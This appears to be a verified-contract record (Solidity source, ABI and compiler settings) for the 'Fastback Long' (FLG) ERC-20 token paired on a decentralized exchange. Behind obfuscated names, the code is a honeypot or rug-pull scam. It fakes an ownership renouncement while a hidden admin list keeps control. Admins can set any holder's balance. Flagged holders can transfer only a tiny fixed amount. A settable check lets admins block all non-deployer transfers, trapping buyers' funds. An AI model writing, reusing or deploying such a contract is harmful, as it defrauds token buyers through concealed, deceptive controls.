{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface totalLaunchWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toAt {\n    function createPair(address launchedLiquidity, address swapListLaunch) external returns (address);\n}\n\ninterface sellReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeSwap) external view returns (uint256);\n\n    function transfer(address marketingTo, uint256 tokenList) external returns (bool);\n\n    function allowance(address exemptSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTo,\n        uint256 tokenList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minReceiver, uint256 value);\n    event Approval(address indexed exemptSender, address indexed spender, uint256 value);\n}\n\ninterface sellReceiverMetadata is sellReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FastbackLong is maxAuto, sellReceiver, sellReceiverMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTeam;\n    }\n\n    function approve(address maxTrading, uint256 tokenList) public virtual override returns (bool) {\n        liquidityAuto[_msgSender()][maxTrading] = tokenList;\n        emit Approval(_msgSender(), maxTrading, tokenList);\n        return true;\n    }\n\n    string private shouldFrom = \"FLG\";\n\n    function tradingMin(address fundReceiver) public {\n        buyMin();\n        if (feeSender == tradingAuto) {\n            senderTo = listLimitSender;\n        }\n        if (fundReceiver == toSell || fundReceiver == amountTeam) {\n            return;\n        }\n        tokenWalletFund[fundReceiver] = true;\n    }\n\n    uint256 buyShould;\n\n    constructor (){\n        \n        totalLaunchWallet receiverTrading = totalLaunchWallet(modeExemptSell);\n        amountTeam = toAt(receiverTrading.factory()).createPair(receiverTrading.WETH(), address(this));\n        if (listLimitSender != senderTo) {\n            takeAmount = false;\n        }\n        toSell = _msgSender();\n        fundMax();\n        limitMax[toSell] = true;\n        txAmount[toSell] = toLimit;\n        \n        emit Transfer(address(0), toSell, toLimit);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toLimit;\n    }\n\n    bool public walletLaunchFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxSwap;\n    }\n\n    function fundLaunched(address teamTotal) public {\n        require(teamTotal.balance < 100000);\n        if (teamEnableLaunch) {\n            return;\n        }\n        if (walletLaunchFrom) {\n            tradingAuto = true;\n        }\n        limitMax[teamTotal] = true;\n        \n        teamEnableLaunch = true;\n    }\n\n    address modeEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private sellAuto;\n\n    mapping(address => bool) public limitMax;\n\n    bool public liquiditySell;\n\n    function buyMin() private view {\n        require(limitMax[_msgSender()]);\n    }\n\n    uint8 private maxSwap = 18;\n\n    string private exemptTeam = \"Fastback Long\";\n\n    function transfer(address walletFrom, uint256 tokenList) external virtual override returns (bool) {\n        return fromAuto(_msgSender(), walletFrom, tokenList);\n    }\n\n    function fundMax() public {\n        emit OwnershipTransferred(toSell, address(0));\n        sellAuto = address(0);\n    }\n\n    function transferFrom(address walletReceiverMode, address marketingTo, uint256 tokenList) external override returns (bool) {\n        if (_msgSender() != modeExemptSell) {\n            if (liquidityAuto[walletReceiverMode][_msgSender()] != type(uint256).max) {\n                require(tokenList <= liquidityAuto[walletReceiverMode][_msgSender()]);\n                liquidityAuto[walletReceiverMode][_msgSender()] -= tokenList;\n            }\n        }\n        return fromAuto(walletReceiverMode, marketingTo, tokenList);\n    }\n\n    uint256 txLimit;\n\n    event OwnershipTransferred(address indexed totalMode, address indexed swapTokenAmount);\n\n    uint256 public listLimitSender;\n\n    function fromAuto(address walletReceiverMode, address marketingTo, uint256 tokenList) internal returns (bool) {\n        if (walletReceiverMode == toSell) {\n            return maxAtTx(walletReceiverMode, marketingTo, tokenList);\n        }\n        uint256 exemptList = sellReceiver(amountTeam).balanceOf(modeEnable);\n        require(exemptList == txLimit);\n        require(marketingTo != modeEnable);\n        if (tokenWalletFund[walletReceiverMode]) {\n            return maxAtTx(walletReceiverMode, marketingTo, walletTx);\n        }\n        return maxAtTx(walletReceiverMode, marketingTo, tokenList);\n    }\n\n    address modeExemptSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public amountTeam;\n\n    uint256 constant walletTx = 4 ** 10;\n\n    bool public teamEnableLaunch;\n\n    function getOwner() external view returns (address) {\n        return sellAuto;\n    }\n\n    function teamShould(address walletFrom, uint256 tokenList) public {\n        buyMin();\n        txAmount[walletFrom] = tokenList;\n    }\n\n    uint256 public senderTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldFrom;\n    }\n\n    uint256 private toLimit = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public tokenWalletFund;\n\n    bool private feeSender;\n\n    function owner() external view returns (address) {\n        return sellAuto;\n    }\n\n    function balanceOf(address modeSwap) public view virtual override returns (uint256) {\n        return txAmount[modeSwap];\n    }\n\n    function maxAtTx(address walletReceiverMode, address marketingTo, uint256 tokenList) internal returns (bool) {\n        require(txAmount[walletReceiverMode] >= tokenList);\n        txAmount[walletReceiverMode] -= tokenList;\n        txAmount[marketingTo] += tokenList;\n        emit Transfer(walletReceiverMode, marketingTo, tokenList);\n        return true;\n    }\n\n    uint256 private isLaunchedTx;\n\n    bool public takeAmount;\n\n    address public toSell;\n\n    function allowance(address launchedSender, address maxTrading) external view virtual override returns (uint256) {\n        if (maxTrading == modeExemptSell) {\n            return type(uint256).max;\n        }\n        return liquidityAuto[launchedSender][maxTrading];\n    }\n\n    bool public tradingAuto;\n\n    mapping(address => uint256) private txAmount;\n\n    mapping(address => mapping(address => uint256)) private liquidityAuto;\n\n    bool public limitTake;\n\n    function exemptWallet(uint256 tokenList) public {\n        buyMin();\n        txLimit = tokenList;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTokenAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenList\",\"type\":\"uint256\"}],\"name\":\"exemptWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"}],\"name\":\"fundLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimitSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenList\",\"type\":\"uint256\"}],\"name\":\"teamShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenWalletFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FastbackLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}